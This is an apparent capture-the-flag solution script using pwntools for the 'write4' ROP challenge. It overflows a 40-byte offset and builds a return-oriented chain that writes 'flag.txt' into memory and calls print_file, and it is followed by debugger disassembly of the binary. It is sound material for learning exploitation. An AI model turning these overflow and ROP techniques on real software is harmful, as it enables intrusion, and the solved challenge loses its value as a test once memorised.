from pwn import *

exe = ELF('./write4')
context.binary = exe
context.log_level = 'info'

libc = ELF('./write4')

if args.REMOTE:
    io = remote('localhost', 4000)
else:
    io = process(exe.path)

offset = 40 #pattern search $rsp

printfile = exe.plt['print_file']


call_printfile = 0x0000000000400620 
pop_rdi = 0x0000000000400693 #ROPgadget --binary ./write4 | grep -E "pop rdi" 
arg = b'flag.txt'
pop_r14_r15 = 0x0000000000400690
data = 0x601028
usefulGadgets = 0x0000000000400628

payload = flat({offset:[pop_r14_r15,
                        data,
                        arg,
                        usefulGadgets,
                        pop_rdi,
                        data,
                        call_printfile]})

io.sendline(payload)

io.interactive()


'''
gef➤  disas pwnme
Dump of assembler code for function pwnme:
   0x00007ffff7c008aa <+0>:	push   rbp
   0x00007ffff7c008ab <+1>:	mov    rbp,rsp
   0x00007ffff7c008ae <+4>:	sub    rsp,0x20
   0x00007ffff7c008b2 <+8>:	mov    rax,QWORD PTR [rip+0x200727]        # 0x7ffff7e00fe0
   0x00007ffff7c008b9 <+15>:	mov    rax,QWORD PTR [rax]
   0x00007ffff7c008bc <+18>:	mov    ecx,0x0
   0x00007ffff7c008c1 <+23>:	mov    edx,0x2
   0x00007ffff7c008c6 <+28>:	mov    esi,0x0
   0x00007ffff7c008cb <+33>:	mov    rdi,rax
   0x00007ffff7c008ce <+36>:	call   0x7ffff7c00790 <setvbuf@plt>
   0x00007ffff7c008d3 <+41>:	lea    rdi,[rip+0x106]        # 0x7ffff7c009e0
   0x00007ffff7c008da <+48>:	call   0x7ffff7c00730 <puts@plt>
   0x00007ffff7c008df <+53>:	lea    rdi,[rip+0x111]        # 0x7ffff7c009f7
   0x00007ffff7c008e6 <+60>:	call   0x7ffff7c00730 <puts@plt>
   0x00007ffff7c008eb <+65>:	lea    rax,[rbp-0x20]
   0x00007ffff7c008ef <+69>:	mov    edx,0x20
   0x00007ffff7c008f4 <+74>:	mov    esi,0x0
   0x00007ffff7c008f9 <+79>:	mov    rdi,rax
   0x00007ffff7c008fc <+82>:	call   0x7ffff7c00760 <memset@plt>
   0x00007ffff7c00901 <+87>:	lea    rdi,[rip+0xf8]        # 0x7ffff7c00a00
   0x00007ffff7c00908 <+94>:	call   0x7ffff7c00730 <puts@plt>
   0x00007ffff7c0090d <+99>:	lea    rdi,[rip+0x115]        # 0x7ffff7c00a29
   0x00007ffff7c00914 <+106>:	mov    eax,0x0
   0x00007ffff7c00919 <+111>:	call   0x7ffff7c00750 <printf@plt>
   0x00007ffff7c0091e <+116>:	lea    rax,[rbp-0x20]
   0x00007ffff7c00922 <+120>:	mov    edx,0x200
   0x00007ffff7c00927 <+125>:	mov    rsi,rax
   0x00007ffff7c0092a <+128>:	mov    edi,0x0
   0x00007ffff7c0092f <+133>:	call   0x7ffff7c00770 <read@plt>
   0x00007ffff7c00934 <+138>:	lea    rdi,[rip+0xf1]        # 0x7ffff7c00a2c
   0x00007ffff7c0093b <+145>:	call   0x7ffff7c00730 <puts@plt>
   0x00007ffff7c00940 <+150>:	nop
   0x00007ffff7c00941 <+151>:	leave
=> 0x00007ffff7c00942 <+152>:	ret
End of assembler dump.

gef➤  disas usefulFunction
Dump of assembler code for function usefulFunction:
   0x0000000000400617 <+0>:	push   rbp
   0x0000000000400618 <+1>:	mov    rbp,rsp
   0x000000000040061b <+4>:	mov    edi,0x4006b4
   0x0000000000400620 <+9>:	call   0x400510 <print_file@plt>
   0x0000000000400625 <+14>:	nop
   0x0000000000400626 <+15>:	pop    rbp
   0x0000000000400627 <+16>:	ret
End of assembler dump.

gef➤  disas usefulGadgets
Dump of assembler code for function usefulGadgets:
   0x0000000000400628 <+0>:	mov    QWORD PTR [r14],r15
   0x000000000040062b <+3>:	ret
   0x000000000040062c <+4>:	nop    DWORD PTR [rax+0x0]
End of assembler dump.

gef➤  disas print_file
Dump of assembler code for function print_file:
   0x00007ffff7c00943 <+0>:	push   rbp
   0x00007ffff7c00944 <+1>:	mov    rbp,rsp
   0x00007ffff7c00947 <+4>:	sub    rsp,0x40
   0x00007ffff7c0094b <+8>:	mov    QWORD PTR [rbp-0x38],rdi
   0x00007ffff7c0094f <+12>:	mov    QWORD PTR [rbp-0x8],0x0
   0x00007ffff7c00957 <+20>:	mov    rax,QWORD PTR [rbp-0x38]
   0x00007ffff7c0095b <+24>:	lea    rsi,[rip+0xd5]        # 0x7ffff7c00a37
   0x00007ffff7c00962 <+31>:	mov    rdi,rax
   0x00007ffff7c00965 <+34>:	call   0x7ffff7c007a0 <fopen@plt>
   0x00007ffff7c0096a <+39>:	mov    QWORD PTR [rbp-0x8],rax
   0x00007ffff7c0096e <+43>:	cmp    QWORD PTR [rbp-0x8],0x0
   0x00007ffff7c00973 <+48>:	jne    0x7ffff7c00997 <print_file+84>
   0x00007ffff7c00975 <+50>:	mov    rax,QWORD PTR [rbp-0x38]
   0x00007ffff7c00979 <+54>:	mov    rsi,rax
   0x00007ffff7c0097c <+57>:	lea    rdi,[rip+0xb6]        # 0x7ffff7c00a39
   0x00007ffff7c00983 <+64>:	mov    eax,0x0
   0x00007ffff7c00988 <+69>:	call   0x7ffff7c00750 <printf@plt>
   0x00007ffff7c0098d <+74>:	mov    edi,0x1
   0x00007ffff7c00992 <+79>:	call   0x7ffff7c007b0 <exit@plt>
   0x00007ffff7c00997 <+84>:	mov    rdx,QWORD PTR [rbp-0x8]
   0x00007ffff7c0099b <+88>:	lea    rax,[rbp-0x30]
   0x00007ffff7c0099f <+92>:	mov    esi,0x21
   0x00007ffff7c009a4 <+97>:	mov    rdi,rax
   0x00007ffff7c009a7 <+100>:	call   0x7ffff7c00780 <fgets@plt>
   0x00007ffff7c009ac <+105>:	lea    rax,[rbp-0x30]
   0x00007ffff7c009b0 <+109>:	mov    rdi,rax
   0x00007ffff7c009b3 <+112>:	call   0x7ffff7c00730 <puts@plt>
   0x00007ffff7c009b8 <+117>:	mov    rax,QWORD PTR [rbp-0x8]
   0x00007ffff7c009bc <+121>:	mov    rdi,rax
   0x00007ffff7c009bf <+124>:	call   0x7ffff7c00740 <fclose@plt>
   0x00007ffff7c009c4 <+129>:	mov    QWORD PTR [rbp-0x8],0x0
   0x00007ffff7c009cc <+137>:	nop
   0x00007ffff7c009cd <+138>:	leave
   0x00007ffff7c009ce <+139>:	ret
End of assembler dump.

gef➤  disas 0x400510
Dump of assembler code for function print_file@plt:
   0x0000000000400510 <+0>:	jmp    QWORD PTR [rip+0x200b0a]        # 0x601020 <print_file@got.plt>
   0x0000000000400516 <+6>:	push   0x1
   0x000000000040051b <+11>:	jmp    0x4004f0
End of assembler dump.
gef➤  
'''